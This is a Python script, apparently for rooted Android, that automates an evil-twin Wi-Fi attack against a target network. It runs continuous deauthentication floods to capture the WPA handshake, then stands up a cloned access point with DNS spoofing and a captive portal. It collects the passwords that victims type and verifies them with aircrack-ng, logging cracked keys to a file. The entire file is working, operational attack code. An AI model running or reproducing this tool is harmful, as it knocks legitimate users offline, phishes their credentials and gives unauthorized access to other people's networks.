#!/usr/bin/env python3
"""
Evil Twin Attack Tool - Python Version
Handshake capture + Fake AP + Password Cracking
Monitor mode and scanning are handled by Android app
"""

import subprocess
import re
import os
import sys
import time
import signal
import argparse
from pathlib import Path
from typing import Dict, List, Optional, Tuple
from dataclasses import dataclass
from datetime import datetime
import logging
import atexit

# Setup logging - NO timestamps in file, NO colors
file_handler = logging.FileHandler('/sdcard/evil_twin_debug.log')
file_handler.setFormatter(logging.Formatter('%(message)s'))

console_handler = logging.StreamHandler(sys.stdout)
console_handler.setFormatter(logging.Formatter('%(asctime)s - %(levelname)s - %(message)s'))

logging.basicConfig(
    level=logging.DEBUG,
    handlers=[file_handler, console_handler]
)
logger = logging.getLogger(__name__)

# Log functions - NO colors
def log_info(msg): logger.info(f"[*] {msg}")
def log_warn(msg): logger.warning(f"[!] {msg}")
def log_error(msg): logger.error(f"[-] {msg}")
def log_success(msg): logger.info(f"[✓] {msg}")
def log_debug(msg): logger.debug(f"[DEBUG] {msg}")

@dataclass
class AttackConfig:
    target_bssid: str = ""
    target_ssid: str = ""
    target_channel: str = ""
    fake_ssid: str = ""
    handshake_file: str = ""
    mon_interface: str = ""
    ap_interface: str = ""
    ap_base: str = ""
    internet_interface: str = ""
    
    deauth_pid: Optional[int] = None
    airodump_pid: Optional[int] = None
    client_check_process: Optional[subprocess.Popen] = None
    
    handshake_captured: bool = False
    password_cracked: bool = False

class EvilTwinAttack:
    def __init__(self):
        self.config = AttackConfig()
        self.running = True
        self.setup_signal_handlers()
        atexit.register(self.cleanup_temp_files)
        
    def setup_signal_handlers(self):
        def cleanup_handler(signum, frame):
            log_info("Shutting down attack...")
            self.running = False
            self.cleanup()
            sys.exit(0)
            
        signal.signal(signal.SIGINT, cleanup_handler)
        signal.signal(signal.SIGTERM, cleanup_handler)
    
    def cleanup_temp_files(self):
        log_info("Logs kept at /sdcard/evil_twin_debug.log for debugging")
        log_debug("Cleaning up temporary files...")
        
        # Delete PID file from /sdcard
        pid_file = Path("/sdcard/evil_twin.pid")
        if pid_file.exists():
            try:
                pid_file.unlink()
                log_debug("Deleted /sdcard/evil_twin.pid")
            except:
                pass
        
        tmp_dir = Path('/tmp')
        patterns = ['client_check*', 'scan*', 'handshake_check*', 'airodump.log', 'deauth.log', 
                   'hostapd.log', 'dnsmasq.log']
        for pattern in patterns:
            for f in tmp_dir.glob(pattern):
                try:
                    f.unlink()
                except:
                    pass
        
        for pattern in ['evil-*.cap', 'evil-*.csv', 'evil-*.kismet.*', 'evil-*.netxml', 
                       '*.pcap', 'attempts.txt', 'password.txt', '*.pid', 'client_check*']:
            for f in Path('.').glob(pattern):
                try:
                    f.unlink()
                except:
                    pass
    
    def run_command(self, cmd: str, check: bool = False, timeout: int = None) -> Tuple[int, str, str]:
        log_debug(f"Running command: {cmd[:100]}...")
        try:
            if timeout:
                result = subprocess.run(cmd, shell=True, capture_output=True, text=True, timeout=timeout)
            else:
                result = subprocess.run(cmd, shell=True, capture_output=True, text=True)
                
            if check and result.returncode != 0:
                log_error(f"Command failed: {cmd}")
                log_error(f"Error: {result.stderr}")
                
            return result.returncode, result.stdout, result.stderr
        except subprocess.TimeoutExpired:
            log_error(f"Command timed out: {cmd}")
            return -1, "", "Timeout"
        except Exception as e:
            log_error(f"Exception running command: {e}")
            return -1, "", str(e)
    
    def restore_iptables(self):
        """Restore iptables from /sdcard/original (no save, just restore if exists)"""
        if Path("/sdcard/original").exists():
            log_info("Restoring original iptables rules from /sdcard/original")
            self.run_command("iptables-restore < /sdcard/original 2>/dev/null")
        else:
            log_warn("No /sdcard/original found, iptables not restored")
    
    def check_for_clients(self, timeout: int = 30) -> int:
        log_info(f"Checking for clients on {self.config.target_bssid} (channel {self.config.target_channel})...")
        
        # Force interface to correct channel
        self.run_command(f"iw dev {self.config.mon_interface} set channel {self.config.target_channel}")
        time.sleep(1)
        
        print(f"\n[!] Listening for clients on {self.config.target_channel}...")
        
        # Clean old files
        for f in Path('/tmp').glob('client_check*'):
            f.unlink()
        for f in Path('.').glob('client_check*'):
            f.unlink()
        
        cmd = f"airodump-ng -c {self.config.target_channel} --bssid {self.config.target_bssid} -w /tmp/client_check {self.config.mon_interface}"
        
        self.config.client_check_process = subprocess.Popen(
            cmd, shell=True,
            stdin=subprocess.DEVNULL,
            stdout=subprocess.DEVNULL,
            stderr=subprocess.DEVNULL
        )
        
        # Countdown
        for i in range(timeout):
            print(f"\rListening for clients... {timeout - i} seconds remaining", end='', flush=True)
            time.sleep(1)
        
        print()
        
        # Kill airodump
        if self.config.client_check_process:
            self.config.client_check_process.terminate()
            time.sleep(2)
            self.config.client_check_process = None
        
        # Parse results
        client_count = 0
        clients = []
        csv_file = Path("/tmp/client_check-01.csv")
        
        if csv_file.exists():
            with open(csv_file, 'r') as f:
                in_station_section = False
                for line in f:
                    if "Station MAC" in line:
                        in_station_section = True
                        continue
                    if in_station_section and line.strip() and not line.startswith("BSSID"):
                        parts = line.split(',')
                        if parts and parts[0].strip():
                            mac = parts[0].strip()
                            if mac and len(mac) == 17:
                                clients.append(mac)
                                client_count += 1
        
        if client_count > 0:
            log_success(f"Found {client_count} client(s):")
            for mac in clients[:5]:
                print(f"  {mac}")
        else:
            log_warn(f"No clients found on {self.config.target_bssid}")
        
        # Clean up
        for f in Path('/tmp').glob('client_check*'):
            f.unlink()
        for f in Path('.').glob('client_check*'):
            f.unlink()
        
        return client_count
    
    def capture_handshake(self) -> bool:
        log_debug("Cleaning old capture files...")
        for pattern in ['evil-*.cap', 'evil-*.csv', 'evil-*.kismet.*', 'evil-*.netxml']:
            for f in Path('.').glob(pattern):
                f.unlink()
        for f in Path('/tmp').glob('handshake_check*'):
            f.unlink()
        
        log_info(f"Capturing handshake for {self.config.target_ssid} on channel {self.config.target_channel}...")
        
        client_count = self.check_for_clients()
        
        if client_count == 0:
            log_warn(f"No clients detected on {self.config.target_ssid}")
            log_info("Exiting attack...")
            self.cleanup()
            sys.exit(1)
        
        self.run_command(f"iw dev {self.config.mon_interface} set channel {self.config.target_channel}")
        time.sleep(2)
        
        log_debug("Starting airodump-ng...")
        with open('/tmp/airodump.log', 'w') as f:
            self.config.airodump_pid = subprocess.Popen(
                f"nohup airodump-ng -c {self.config.target_channel} --bssid {self.config.target_bssid} -w evil {self.config.mon_interface} > /tmp/airodump.log 2>&1 &",
                shell=True,
                stdin=subprocess.DEVNULL
            ).pid
        
        time.sleep(3)
        
        log_debug("Starting aireplay-ng deauth...")
        with open('/tmp/deauth.log', 'w') as f:
            self.config.deauth_pid = subprocess.Popen(
                f"nohup aireplay-ng -0 0 -a {self.config.target_bssid} {self.config.mon_interface} > /tmp/deauth.log 2>&1 &",
                shell=True,
                stdin=subprocess.DEVNULL
            ).pid
        
        log_info("Deauth running - waiting for handshake (max 60 seconds)...")
        
        handshake_captured = False
        
        for i in range(60):
            capture_files = list(Path('.').glob('evil-*.cap'))
            if capture_files:
                capture_file = capture_files[0]
                self.run_command(f"cp {capture_file} /tmp/handshake_check.cap")
                
                ret, _, _ = self.run_command("aircrack-ng /tmp/handshake_check.cap 2>/dev/null | grep -q '1 handshake'")
                if ret == 0:
                    log_success(f"Handshake captured at {i} seconds!")
                    handshake_captured = True
                    break
                
                ret2, eapol_out, _ = self.run_command("tshark -r /tmp/handshake_check.cap -Y eapol 2>/dev/null | wc -l")
                if ret2 == 0 and eapol_out.strip():
                    eapol_count = int(eapol_out.strip())
                    if eapol_count >= 4:
                        log_success(f"Found {eapol_count} EAPOL packets - handshake captured!")
                        handshake_captured = True
                        break
            
            if i % 5 == 0:
                print(f"\rWaiting for handshake... {i} seconds elapsed", end='', flush=True)
            time.sleep(1)
        
        print()
        
        if self.config.airodump_pid:
            self.run_command(f"kill {self.config.airodump_pid} 2>/dev/null")
        if self.config.deauth_pid:
            self.run_command(f"kill {self.config.deauth_pid} 2>/dev/null")
        time.sleep(2)
        
        if handshake_captured:
            safe_ssid = re.sub(r'[^a-zA-Z0-9]', '_', self.config.target_ssid)
            self.config.handshake_file = f"{safe_ssid}.cap"
            
            capture_files = list(Path('.').glob('evil-*.cap'))
            if capture_files:
                self.run_command(f"cp {capture_files[0]} {self.config.handshake_file}")
                log_success(f"Handshake saved as: {self.config.handshake_file}")
                self.config.handshake_captured = True
            
            for f in Path('.').glob('evil-*.cap'):
                f.unlink()
            return True
        else:
            log_warn("No handshake captured after 60 seconds")
            log_info("Exiting attack...")
            self.cleanup()
            sys.exit(2)
    
    def setup_internet_sharing(self) -> bool:
        log_info("Setting up internet sharing...")
        
        ret, stdout, _ = self.run_command("ip route get 8.8.8.8 2>/dev/null | grep -oP 'table \\K\\d+'")
        table = stdout.strip() if stdout.strip() else "main"
        
        log_debug(f"Routing table: {table}")
        
        if self.config.ap_base != self.config.ap_interface:
            log_info(f"Creating virtual AP interface {self.config.ap_interface} from {self.config.ap_base}...")
            
            self.run_command(f"iw dev {self.config.ap_interface} del 2>/dev/null")
            time.sleep(1)
            
            ret, _, _ = self.run_command(f"iw dev {self.config.ap_base} interface add {self.config.ap_interface} type __ap")
            if ret != 0:
                log_error(f"Failed to create virtual interface {self.config.ap_interface}")
                return False
            
            self.run_command(f"ip addr flush {self.config.ap_interface}")
            self.run_command(f"ip link set up dev {self.config.ap_interface}")
            time.sleep(2)
        else:
            log_info(f"Using existing interface {self.config.ap_interface} directly for AP")
            self.run_command(f"ip link set {self.config.ap_interface} down")
            self.run_command(f"iw dev {self.config.ap_interface} set type __ap")
            self.run_command(f"ip link set {self.config.ap_interface} up")
            time.sleep(2)
        
        log_info("Adding iptables for internet sharing...")
        self.run_command("iptables --flush")
        self.run_command(f"ifconfig {self.config.ap_interface} up 10.0.0.1 netmask 255.255.255.0")
        self.run_command(f"iptables -t nat -A PREROUTING -i {self.config.ap_interface} -p tcp --dport 80 -j DNAT --to-destination 10.0.0.1:80")
        self.run_command(f"iptables --table nat --append POSTROUTING --out-interface {self.config.internet_interface} -j MASQUERADE")
        self.run_command(f"iptables --append FORWARD --in-interface {self.config.ap_interface} -j ACCEPT")
        
        with open('/proc/sys/net/ipv4/ip_forward', 'w') as f:
            f.write("1")
        
        log_info("Starting services...")
        
        subprocess.Popen(
            "sleep 5 && hostapd hostapd.conf 2>&1 | tee /tmp/hostapd.log > /dev/null 2>&1",
            shell=True,
            stdin=subprocess.DEVNULL,
            stdout=subprocess.DEVNULL,
            stderr=subprocess.DEVNULL
        )
        time.sleep(8)
        
        subprocess.Popen(
            "dnsmasq -C dnsmasq.conf --log-dhcp -d > /tmp/dnsmasq.log 2>&1",
            shell=True,
            stdin=subprocess.DEVNULL,
            stdout=subprocess.DEVNULL,
            stderr=subprocess.DEVNULL
        )
        time.sleep(3)
        
        subprocess.Popen(
            f"dnsspoof -i {self.config.ap_interface} > /dev/null 2>&1",
            shell=True,
            stdin=subprocess.DEVNULL,
            stdout=subprocess.DEVNULL,
            stderr=subprocess.DEVNULL
        )
        
        return True
    
    def update_configs(self):
        log_info("Configuring attack...")
        
        if Path("passapi.py").exists():
            self.run_command(f"sed -i 's/target = .*/target = \"{self.config.target_bssid}\"/' passapi.py")
            self.run_command(f"sed -i 's/ssid_name = .*/ssid_name = \"{self.config.target_ssid}\"/' passapi.py")
            self.run_command(f"sed -i 's/handshake_file = .*/handshake_file = \"{self.config.handshake_file}\"/' passapi.py")
        
        if Path("hostapd.conf").exists():
            self.run_command(f"sed -i 's/^ssid=.*/ssid={self.config.target_ssid}/' hostapd.conf")
            self.run_command(f"sed -i 's/^channel=.*/channel={self.config.target_channel}/' hostapd.conf")
            self.run_command(f"sed -i 's/^interface=.*/interface={self.config.ap_interface}/' hostapd.conf")
        
        if Path("dnsmasq.conf").exists():
            self.run_command(f"sed -i 's/^interface=.*/interface={self.config.ap_interface}/' dnsmasq.conf")
    
    def start_evil_twin(self) -> bool:
        log_info("Starting evil twin...")
        
        if not self.setup_internet_sharing():
            return False
        
        time.sleep(8)
        
        subprocess.Popen(
            "python3 passapi.py > /dev/null 2>&1",
            shell=True,
            stdin=subprocess.DEVNULL,
            stdout=subprocess.DEVNULL,
            stderr=subprocess.DEVNULL
        )
        
        time.sleep(3)
        
        subprocess.Popen(
            "cd portal && php -S 10.0.0.1:80 router.php > /dev/null 2>&1",
            shell=True,
            stdin=subprocess.DEVNULL,
            stdout=subprocess.DEVNULL,
            stderr=subprocess.DEVNULL
        )
        
        time.sleep(8)
        log_success("Evil twin is live")
        return True
    
    def monitor_attack(self):
        log_info("Continuous deauth maintained from capture phase")
        
        print("\n===============================")
        print("ATTACK RUNNING")
        print("===============================")
        print(f"Target:    {self.config.target_ssid}")
        print(f"Channel:   {self.config.target_channel}")
        print(f"AP Interface: {self.config.ap_interface}")
        print(f"Internet:  {self.config.internet_interface}")
        print(f"Handshake: {self.config.handshake_file}")
        print("----------------------------------------")
        print("Monitoring connections & credentials...")
        print("----------------------------------------\n")
        
        shown_connections = set()
        connection_cache = set()
        hostapd_pos = 0
        dnsmasq_pos = 0
        
        while self.running:
            if Path("password.txt").exists():
                with open("password.txt", 'r') as f:
                    passwords = f.readlines()
                
                for password in passwords:
                    password = password.strip()
                    if password and password not in shown_connections:
                        shown_connections.add(password)
                        # Send to both files
                        print(f"\n[!] New password attempt: {password}")
                        log_warn(f"New password attempt: {password}")
                        
                        if self.config.handshake_captured and Path(self.config.handshake_file).exists():
                            ret, stdout, _ = self.run_command(f"aircrack-ng {self.config.handshake_file} -b {self.config.target_bssid} -w password.txt 2>/dev/null | grep -q 'KEY FOUND'")
                            if ret == 0:
                                # Send to both files
                                print(f"\nPASSWORD CRACKED: {password}")
                                log_success(f"PASSWORD CRACKED: {password}")
                                timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
                                with open("cracked.txt", 'a') as f:
                                    f.write(f"{timestamp} | SSID: {self.config.target_ssid} | BSSID: {self.config.target_bssid} | Password: {password}\n")
                                print("Cracked Network Saved in: cracked.txt")
                                log_success("Cracked Network Saved in: cracked.txt")
                                self.config.password_cracked = True
                                self.running = False
                                break
            
            if Path("/tmp/hostapd.log").exists():
                with open("/tmp/hostapd.log", 'r') as f:
                    f.seek(hostapd_pos)
                    for line in f:
                        if "AP-STA-CONNECTED" in line:
                            mac_match = re.search(r'([0-9a-f]{2}:){5}[0-9a-f]{2}', line)
                            if mac_match:
                                mac = mac_match.group()
                                if mac not in connection_cache:
                                    connection_cache.add(mac)
                                    # Send to both files
                                    print(f"[+] Device connected: {mac}")
                                    log_info(f"Device connected: {mac}")
                        elif "AP-STA-DISCONNECTED" in line:
                            mac_match = re.search(r'([0-9a-f]{2}:){5}[0-9a-f]{2}', line)
                            if mac_match:
                                mac = mac_match.group()
                                if mac in connection_cache:
                                    connection_cache.remove(mac)
                                    # Send to both files
                                    print(f"[-] Device disconnected: {mac}")
                                    log_info(f"Device disconnected: {mac}")
                    hostapd_pos = f.tell()
            
            if Path("/tmp/dnsmasq.log").exists():
                with open("/tmp/dnsmasq.log", 'r') as f:
                    f.seek(dnsmasq_pos)
                    for line in f:
                        if "query" in line and ("captive.apple.com" in line or "msftconnecttest.com" in line):
                            ip_match = re.search(r'from ([0-9.]+)', line)
                            if ip_match:
                                ip = ip_match.group(1)
                                ret, stdout, _ = self.run_command(f"arp -n | grep '^{ip} ' | awk '{{print $3}}'")
                                mac = stdout.strip()
                                if mac:
                                    if "captive.apple.com" in line:
                                        # Send to both files
                                        print(f"[DNS] Apple device detected: {mac}")
                                        log_info(f"Apple device detected: {mac}")
                                    elif "msftconnecttest.com" in line:
                                        # Send to both files
                                        print(f"[DNS] Windows device detected: {mac}")
                                        log_info(f"Windows device detected: {mac}")
                    dnsmasq_pos = f.tell()
            
            time.sleep(3)
        
        self.cleanup()
    
    def cleanup(self):
        log_info("Cleaning up...")
        
        if self.config.client_check_process:
            self.config.client_check_process.terminate()
        
        for proc in ['hostapd', 'dnsmasq', 'airodump-ng', 'aireplay-ng', 'dnsspoof', 'passapi.py', 'php']:
            self.run_command(f"pkill -f {proc} 2>/dev/null")
        
        if self.config.deauth_pid:
            self.run_command(f"kill {self.config.deauth_pid} 2>/dev/null")
        if self.config.airodump_pid:
            self.run_command(f"kill {self.config.airodump_pid} 2>/dev/null")
        
        if self.config.ap_interface and self.config.ap_base != self.config.ap_interface:
            log_info(f"Removing virtual AP interface {self.config.ap_interface}...")
            self.run_command(f"iw dev {self.config.ap_interface} del 2>/dev/null")
        
        # Restore iptables from /sdcard/original (no save, no flush, no ip forward disable)
        self.restore_iptables()
        
        log_info("Monitor mode interface left active. Use 'iw dev' to reset if needed.")
        
        self.cleanup_temp_files()
        log_success("Cleanup complete")
    
    def run(self):
        parser = argparse.ArgumentParser(description='Evil Twin Attack Tool')
        parser.add_argument('--interface', required=True, help='Monitor interface (already in monitor mode)')
        parser.add_argument('--bssid', required=True, help='Target BSSID')
        parser.add_argument('--channel', required=True, help='Target channel')
        parser.add_argument('--ssid', required=True, help='Target SSID')
        parser.add_argument('--ap-source', required=True, choices=['virtual', 'existing', 'custom'], help='AP source type')
        parser.add_argument('--ap-name', required=True, help='AP interface name')
        parser.add_argument('--internet', required=True, help='Internet source (wlan0, auto, or custom interface name)')
        
        args = parser.parse_args()
        
        try:
            with open("/sdcard/evil_twin.pid", "w") as f:
                f.write(str(os.getpid()))
            log_debug(f"PID written to /sdcard/evil_twin.pid: {os.getpid()}")
        except Exception as e:
            log_warn(f"Failed to write PID file: {e}")
        
        self.config.mon_interface = args.interface
        self.config.target_bssid = args.bssid
        self.config.target_channel = args.channel
        self.config.target_ssid = args.ssid
        self.config.fake_ssid = args.ssid
        
        if args.ap_source == 'virtual':
            self.config.ap_base = "wlan0"
            self.config.ap_interface = args.ap_name
        else:
            self.config.ap_base = args.ap_name
            self.config.ap_interface = args.ap_name
        
        if args.internet == 'auto':
            ret, stdout, _ = self.run_command("ip route get 8.8.8.8 2>/dev/null | awk '{print $5}'")
            self.config.internet_interface = stdout.strip() if stdout.strip() else 'rmnet_data0'
        else:
            self.config.internet_interface = args.internet
        
        print("========================================")
        print("      EVIL TWIN ATTACK")
        print("========================================")
        
        if os.geteuid() != 0:
            log_error("Run as root")
            sys.exit(1)
        
        if not self.capture_handshake():
            sys.exit(1)
        
        self.update_configs()
        
        if not self.start_evil_twin():
            sys.exit(1)
        
        self.monitor_attack()

if __name__ == "__main__":
    attack = EvilTwinAttack()
    attack.run()